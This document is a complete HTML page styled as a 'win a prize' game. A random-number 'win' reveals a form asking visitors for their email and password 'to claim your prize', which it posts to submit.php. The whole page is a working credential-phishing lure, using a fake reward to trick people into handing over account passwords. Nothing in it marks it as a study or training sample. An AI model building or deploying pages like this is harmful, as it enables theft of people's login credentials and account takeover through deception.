<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome to My Website</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f0f0f0;
    }

    header {
        background-color: #333;
        color: #fff;
        padding: 20px;
        text-align: center;
    }

    h1 {
        margin: 0;
    }

    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }

    #game-result {
        font-size: 20px;
        margin-bottom: 20px;
    }

    #email-form {
        display: none;
    }

    label {
        display: block;
        margin-bottom: 10px;
    }

    input[type="text"],
    input[type="password"],
    input[type="submit"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 20px;
        border: 1px solid #ccc;
        border-radius: 5px;
        box-sizing: border-box;
    }

    input[type="submit"] {
        background-color: #333;
        color: #fff;
        cursor: pointer;
    }
</style>
</head>
<body>
<header>
    <h1>Welcome to My Website</h1>
    <p>Play our simple game and win a prize!</p>
</header>

<div class="container">
    <div id="game-result">
        Click the button to play the game!
    </div>
    <button onclick="playGame()">Play Game</button>

    <div id="email-form">
        <h2>Congratulations!</h2>
        <p>You won the game!</p>
        <p>Please enter your email and password to claim your prize:</p>
        <form action="submit.php" method="post">
            <label for="email">Email:</label>
            <input type="text" id="email" name="email" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" value="Submit">
        </form>
    </div>
</div>

<script>
    function playGame() {
        // Generate a random number between 0 and 1
        const randomNumber = Math.random();

        // Check if the random number is greater than 0.5 to simulate winning
        if (randomNumber > 0.5) {
            // If the player wins, show the email form
            document.getElementById('game-result').innerText = 'Congratulations! You won!';
            document.getElementById('email-form').style.display = 'block';
        } else {
            // If the player loses, inform them to try again
            document.getElementById('game-result').innerText = 'Sorry, you didn\'t win. Try again!';
        }
    }
</script>
</body>
</html>
